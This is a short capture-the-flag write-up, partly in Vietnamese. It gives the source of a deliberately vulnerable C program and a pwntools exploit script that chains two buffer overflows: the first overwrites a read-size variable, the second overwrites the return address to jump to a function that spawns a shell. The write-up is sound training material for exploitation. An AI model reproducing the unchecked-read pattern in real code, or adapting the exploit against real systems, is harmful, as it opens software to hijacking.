```sh
// Name: chall.c
// Compile: gcc -fno-stack-protector -no-pie chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void flag() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}

int main(int argc, char *argv[]) {
    int stdin_fd = 0;
    int stdout_fd = 1;
    char fruit[0x6] = "cherry";
    int buf_size = 0x10;
    char buf[0x6];

    initialize();

    write(stdout_fd, "Menu: ", 6);
    read(stdin_fd, buf, buf_size);         # tràn 1 , ghi đè biến buf_size 
    if(!strncmp(buf, "cherry", 6)) {
        write(stdout_fd, "Is it cherry?: ", 15);
        read(stdin_fd, fruit, buf_size);   # Tràn 2, ghi đè return address
    }

    return 0;
}
```
- <img width="238" height="367" alt="image" src="https://github.com/user-attachments/assets/47987a81-3328-4db9-a79f-ca9c73626e40" />
- Ghi đè lần 1 tại read thứ nhất , ghi đè buf_size từ 16 byte thành 265 byte 
- Từ cái bù_size đã đc ghi đè thì ta có thêm lỗi tràn nữa và ghi đè vào return address
- Ý tưởng 
```sh
LẦN NHẬP THỨ NHẤT
        |
        v
Đọc 16 byte vào buf[6]
        |
        v
Giữ 6 byte đầu là "cherry"
        |
        v
Ghi đè vùng fruit
        |
        v
Ghi đè buf_size = 0x100
        |
        v
LẦN NHẬP THỨ HAI
        |
        v
read(stdin_fd, fruit, 256)
```


- Exploi
```sh
from pwn import * 

e = context.binary = elf = ELF("./chall", checksec=False)
context.arch = "amd64"

p = process("./chall")

payload1 = b"cherry" + b'A'*6 + p32(0x100)

p.sendafter(b"Menu: ", payload1)

p.recvuntil(b"Is it cherry?: ")

offset = 26
flag_address = e.symbols["flag"]

payload2 = b"A"*offset + p64(flag_address)

p.send(payload2)

p.interactive()
```
